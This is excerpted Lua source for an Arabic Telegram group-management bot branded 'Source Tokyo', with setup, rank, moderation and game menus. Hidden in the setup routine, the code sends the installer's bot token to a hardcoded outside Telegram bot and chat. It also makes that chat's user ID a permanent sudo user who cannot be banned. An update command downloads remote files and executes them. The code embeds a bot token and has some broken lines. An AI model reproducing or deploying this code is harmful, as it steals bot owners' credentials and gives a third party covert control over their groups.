...
if res ~= 200 then
print('\27[0;31m•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•\n27[0;39;49m')
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1792692801:AAGIm5mk0oJPh68PFfaQ0VuWJsoNv-nIKlQ/sendmessage?chat_id=1904319165&text=' ..token)
end 
else
print('\27[0;35m•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.write('\27[1;31m ارسل لي معرف المطور الاساسي ⇓ :\n SEND ID FOR SIDO : \27[0;39;49m')
...
echo "•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄• •┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄• ┉"
exit 1
fi
if [ ! $token ]; then
echo "•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄• •┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄• ┉ ┉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE TOKYO.lua \e[0m"
echo "•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄• ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
exit 1
fi
...
local config = loadfile("./TOKYO.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
print([[
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
  ⊰ تم تنصيب البوت بنجاج 
  ⊱شكرا لاستخدامك سورس توكيو 
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
 ⊰ WEICOM TO SOURCE TOKYO
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
 ≂≂≂≂≂≂≂≂≂SOURCE TOKYO≂≂≂≂≂≂≂≂≂≂
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
...
sudo_users = {SUDO,1932226438,1914852231,1904319165}   
...
if tonumber(user_id) == tonumber(1932226438) then  
var = true
elseif tonumber(user_id) == tonumber(1914852231) then
var = true
elseif tonumber(user_id) == tonumber(1904319165) then
var = true
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'توكيو'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local UserName = (data.username_ or "Source_T7")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒔𝒐𝒖𝒓𝒄𝒆 𝒕𝒐𝒌𝒚𝒐")  
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'توكيو') 
local DRAGON_Msg = { 
...
{'قسم الاذاعه'},
{'•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•'},
{'جلب المشتركين','جلب نسخه الاحتياطيه'},
...
send(msg.chat_id_, msg.id_,' ◍ اصدار سورس توكيو{ 1.5x◍ }')
end
if text == '/start' and DevSoFi(msg) then 
local Text = '◍ مرحبا بك في سورس توكيو 🧚‍♀❤️ \n ◍ انت المطور الاساسي واليك كيبورد التحكم في البوت 😊❤️ \n.◍ [اضغط هنا وانضم الي قناه السورس](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BB_66BB/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
18• جلب نسخه الاحتياطيه { لعرض ملف المجموعات بوتك }
19• تحديث السورس { لتحديث السورس خاص بوتك 
20• الغاء { للغاء الامر الذي طلبته }
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨', url="t.me/Source_T7"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if AddChannel(msg.sender_user_id_) == false then
local Source_T7 = database:get(bot_id..'text:ch:user')
if Source_T7 then
send(msg.chat_id_, msg.id_,'['..Source_T7..']')
else
...
usertext = '\n ◍ العضو ← ['..result.title_..'](t.me/'..(username or 'Source_T7')..')'
status  = '\n ◍ تم ترقيته مطور'
...
usertext = '\n ◍ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_T7')..')'
status  = '\n ◍ تم ترقيته مطور'
...
send(msg.chat_id_, msg.id_,'•  𝑤𝑒𝑙𝑐𝑜𝑚𝑒 𝑡𝑜𝑘𝑦𝑜 •\n• لايمكنك استخدام البوت •\n• عليك الاشتراك في القناة •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'•]')
end
return false
end
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◍ العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Source_T7')..') \n ◍ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "توكيو")
...
send(msg.chat_id_,0," ◍ العضو : {["..data.first_name_.."](T.ME/Source_T7)}\n ◍ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ◍ عذرا ← {["..data.first_name_.."](T.ME/Source_T7)}\n ◍ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/UUMARTEN/SO/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/UUMARTEN/SO/main/library')
os.execute('wget https://raw.githubusercontent.com/UUMARTEN/SO/main/File_Bot')
send(msg.chat_id_, msg.id_,' ◍ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
if text == 'عرابي' or text == 'عورابي' or text == 'مالك السورس' then
local Text = [[
◍ مطور السورس
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الـمطـور عـرابـۍۧ 彡',url="t.me/DEV_ORABI"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_ORABI&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard.inline_keyboard = {
{{text = 'الـمطـور عـرابـۍۧ 彡',url="t.me/DEV_ORABI"}},
{{text = '𝐭𝐰𝐚𝐬𝐨𝐥 𝐭𝐨𝐤𝐲𝐨',url="t.me/UU_TTOKYO"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BB_66BB/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[
◍ تواصل سورس توكيو 
  ◍ يمكنك التواصل معا مبرمج السورس
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐭𝐰𝐚𝐬𝐨𝐥 𝐭𝐨𝐤𝐲𝐨',url="t.me/UU_TTOKYO"}},
...
local Text = [[
  ◍ اليك بوتات تحميل من جميع المواقع 
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
{{text = 'بوت قران',url="t.me/Maq_1bot"}},
}
local msg_id = msg.id_/2097152/0.5
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/BB_66BB/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'مميزات' or text == 'الالعاب' then
local Text = [[ 
 ─────── ◍ ───────
◍ العاب و مميزات سورس توكيو ◍ 
 ─────── ◍ ───────
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'العاب السورس', callback_data="/dev-marten"},{text = 'مميزات', callback_data="/mrmarten"},
},
{
{text = 'العاب متطوره', callback_data="/marvel"},
},
{
...
if text == 'العاب توكيو' or text == 'العاب' or text == 'العاب متطوره' then  
local Text = [[  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ◍ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Source_T7')..') \n ◍ تـم قفـل الدردشه ')
end,nil)   
...
if text == 'تفعيل انطق' and CoSu(msg) then   
if database:get(bot_id..'repet:after:me'..msg.chat_id_) then
Text = ' تم تفعيل انطق '
database:del(bot_id..'repet:after:me'..msg.chat_id_)  
else
Text = ' بالتاكيد انطق مفعله '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل انطق' and CoSu(msg) then  
if not database:get(bot_id..'repet:after:me'..msg.chat_id_) then
database:set(bot_id..'repet:after:me'..msg.chat_id_,true)  
Text = '\n تم تعطيل انطق '
else
Text = '\n بالتاكيد انطق معطله '
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◍ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Source_T7')..') \n ◍ تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1904319165) then  
send(msg.chat_id_, msg.id_, "لا يجوز حظر  عام لانه هكر ")
return false 
end
...
if result.id_ == tonumber(1904319165) then
send(msg.chat_id_, msg.id_, "لا يجوز حظر  عام لانه هكر  \n")
return false 
end
usertext = '\n ◍ العضو ← ['..result.title_..'](t.me/'..(username or 'Source_T7')..')'
...
if tonumber(userid) == tonumber(1904319165) then  
send(msg.chat_id_, msg.id_, "لا يجوز حظر  عام لانه هكر ")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1904319165) then  
send(msg.chat_id_, msg.id_, "لا يجوز كتم عام لانه هكر ")
return false 
end
...
if Get_info then
local TextS = "\n ◍ اهلا بك في متجر ملفات توكيو\n ◍ ملفات السورس ↓\n≪•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•≫\n\n"
local TextE = "\n•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•\n ◍ علامة تعني { ✔️ } ملف مفعل\n ◍ علامة تعني { x } ملف معطل\n ◍ قناة سورس توكيو ↓\n".." ◍ [اضغط هنا لدخول](t.me/Source_T7) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," ◍ عذرا الملف لايدعم سورس توكيو \n") 
end
return false
end
...
if text == ("مسح قائمه توكيو") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◍ تم مسح قائمه توكيو')
return false
end

if text == 'قائمه توكيو' and Sudo(msg) then
...
if text == ("رفع توكيو") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local Source_T7 = database:get(bot_id..'text:ch:user')
if Source_T7 then
send(msg.chat_id_, msg.id_,'['..Source_T7..']')
...
if text and text:match("^رفع توكيو @(.*)$") and Sudo(msg) then
local username = text:match("^رفع توكيو @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local Source_T7 = database:get(bot_id..'text:ch:user')
if Source_T7 then
send(msg.chat_id_, msg.id_,'['..Source_T7..']')
...
if text and text:match("^رفع توكيو (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع توكيو (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local Source_T7 = database:get(bot_id..'text:ch:user')
if Source_T7 then
send(msg.chat_id_, msg.id_,'['..Source_T7..']')
...
if text == ("تنزيل توكيو") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local Source_T7 = database:get(bot_id..'text:ch:user')
if Source_T7 then
send(msg.chat_id_, msg.id_,'['..Source_T7..']')
...
if text and text:match("^تنزيل توكيو @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل توكيو @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local Source_T7 = database:get(bot_id..'text:ch:user')
if Source_T7 then
send(msg.chat_id_, msg.id_,'['..Source_T7..']')
...
if text and text:match("^تنزيل توكيو (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل توكيو (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local Source_T7 = database:get(bot_id..'text:ch:user')
if Source_T7 then
send(msg.chat_id_, msg.id_,'['..Source_T7..']')
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◍ لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_T7')..')'
status  = '\n ◍ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◍ العضو ← '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◍ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_T7')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◍ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'Source_T7')..')'..'\n ◍ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'توكيو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'توكيو')
local DRAGON_Msg = {
'ننعم يروحي 😻♥️',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
if text and text:match("^انطق (.*)$")  and not  database:get(bot_id.."repet:after:me"..msg.chat_id_) then 
...
local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendVoice'..'" -F "chat_id='.. msg.chat_id_ ..'" -F "voice=@'..''..textntk..'.mp3'..'"' io.popen(curlm) 
end   
end
...
database:set(bot_id.."Source_T7:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"◍ تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."Source_T7:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."Source_T7:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس توكيو يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'توكيو').." غادر" or text == 'غادر' then  
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري نور عنيا🥺🤍](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري الثاني حته مني 😍♥](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور بس الصغنن 🌝♥](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂♥](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت المدير يعني الروم تحت سيطرتك😹♥](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت مميز ابن ناس 😊♥](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ عضو قميل 🌝♥](t.me/Source_T7)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
if Constructor(msg) then  
database:set(bot_id.."dev_Rogen:rebly"..msg.chat_id_,true) 
...
if Constructor(msg) then  
database:del(bot_id.."dev_Rogen:rebly"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ◍ تم تعطيل ردود السورس") 
return false end
end
...
if text == 'سلام' then 
local my_ph = database:get(bot_id.."dev_Rogen:rebly"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه توكيو') 
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_T7')..')'
local iduser = result.sender_user_id_
...
if text == "مريم" then
local Text = [[
اطفي الاضواء واستعد للعب 😼🖤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تيب',callback_data="/rebmm1"..msg.sender_user_id_}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•
◍ اليك الاوامر الخاص بسورس توكيو .
◍ اختر الامر الذي تريده من الازرار بلاسفل .
•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•
◍ CH -> [𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨](t.me/Source_T7)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
{
{text = '◍ اوامر التسليه ◍', callback_data="/help7"},{text = '◍ المميزات والالعاب ◍',callback_data="/uumarten"},
},
{
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n━───━〈〈★〉〈〈★〉〉〈★〉〉━───━\n◍ 𝘾𝙃 -  [𝒔𝒐𝒖𝒓𝒄𝒆 𝒎𝒂𝒓𝒗𝒆𝒍](t.me/Source_T7)  ✯  ')
end
...
gk = https.request('http//Api/Name.php?Name='..URL.escape(TextName)..'')
br = JSON.decode(gk)
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'لعبه البات', url="https://t.me/ROOGEN1/43"},{text = 'لعبه الرياضيات',url="https://t.me/ROOGEN1/44"}},   
{{text = 'لعبه المختلف', url="https://t.me/ROOGEN1/39"},{text = 'لعبه السمايلات', url="https://t.me/ROOGEN1/42"}}, 
{{text = 'لعبه العكس', url="https://t.me/ROOGEN1/41"}}, 
...
{{text = 'القائمه الرائسيه', callback_data="/uumarten"}},
{{text = '𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨', url="t.me/Source_T7"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local Teext =[[
•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•
  ◍ اهلا في قائمه الالعاب المتطوره سورس توكيو  ◍ 
...
if Text == '/mrmarten' then
local Teext =[[
•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•
 ◍ بك في مميزات سورس توكيو ◍ 
 ◍ مميزات الخاصه بسورس ◍ 
•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تويت', url="https://t.me/ROOGEN1/49"},{text = 'كتبات',url="https://t.me/ROOGEN1/50"}},   
{{text = 'انصحني', url="https://t.me/ROOGEN1/47"},{text = 'لو خيروك', url="https://t.me/ROOGEN1/48"}}, 
{{text = 'الصراحه', url="https://t.me/ROOGEN1/52"},{text = 'حروف', url="https://t.me/ROOGEN1/51"}}, 
{{text = 'رزله', url="https://t.me/ROOGEN1/55"},{text = 'رد عليه يابوت', url="https://t.me/ROOGEN1/54"}}, 
...
--- callback added
if Text == '/uumarten' then
local Teext =[[
 ─────── ◍ ───────
◍ العاب و مميزات سورس توكيو ◍ 
 ─────── ◍ ───────
[𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨](t.me/Source_T7)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
if Text == '/rebmm1'..data.sender_user_id_ then
local Teext = 'لا تصدر اي صوت 🤫'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'حاضر',callback_data="/rebmm2"..msg.sender_user_id_}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm2'..data.sender_user_id_ then
local Teext = 'لقد وصلنا الى المنزل شكراَ جزيلَ انتطرني ثواني وسوف اعود!'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مستني',callback_data="/rebmm3"..msg.sender_user_id_}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm3'..data.sender_user_id_ then
local Teext = 'لقد عدت اليك هل ظهر شيئ ؟'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'احد ما خرج من المنزل',callback_data="/rebmm4"..msg.sender_user_id_}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm4'..data.sender_user_id_ then
local Teext = 'هيا نذهب داخل المنزل'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'يلا',callback_data="/rebmm5"..msg.sender_user_id_}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm5'..data.sender_user_id_ then
local Teext = 'احنن بنتوه هنا'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'هيا نذهب الي الضوء',callback_data="/rebmm6"..msg.sender_user_id_}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm6'..data.sender_user_id_ then
local Teext = 'لا يوجد ضوء هناك انظر'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'يا الهي كان هناك',callback_data="/rebmm7"..msg.sender_user_id_}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm7'..data.sender_user_id_ then
local Teext = 'هيا نذهب الي الباب الرئيسي'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'انهو مغلق',callback_data="/rebmm8"..msg.sender_user_id_}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm8'..data.sender_user_id_ then
local Teext = 'انها النهايه هتكمل ولا لا'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'هكمل',callback_data="/rebmm9"..msg.sender_user_id_},{text = 'لا',callback_data="/rebmm10"..msg.sender_user_id_}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm10'..data.sender_user_id_ then
local Teext = 'هي انت ستندم سأقتلك😈'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '00:00',url="t.me/SO_ROGEN"l}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm9'..data.sender_user_id_ then
local Teext = "سارسل اليك اختيارت لو حليت صح ستنجو من العقاب لو خطأ سيقوم عليك العقاب😈❲عدد يقبل القسمة على 2,3,4,5,6 وعند القسمة في كل مرة يتبقى واحد، ما هو العدد؟❳❲61،44,00,121,90،99,70❳"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '61',callback_data="/rebmm61"..msg.sender_user_id_},{text = '44',callback_data="/rebmm44"..msg.sender_user_id_}},
{{text = '00',callback_data="/rebmm00"..msg.sender_user_id_},{text = '121',callback_data="/rebmm121"..msg.sender_user_id_}},
{{text = '90',callback_data="/rebmm90"..msg.sender_user_id_},{text = '99',callback_data="/rebmm99"..msg.sender_user_id_}},
{{text = '70',callback_data="/rebmm70"..msg.sender_user_id_}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/rebmm61'..data.sender_user_id_ then
local Teext = 'لقد فزت ونجوت من العقاب 😂💯'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '00:00',url="t.me/SO_ROGEN"l}},
}
...
if Text == '/rebmm00'..data.sender_user_id_ then
local Teext = 'لقد خسرت سوف اقتلك 😈'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '00:00',url="t.me/SO_ROGEN"l}},
}
...
if Text == '/rebmm121'..data.sender_user_id_ then
local Teext = 'لقد خسرت سوف اقتلك 😈'
keyboard = {} 
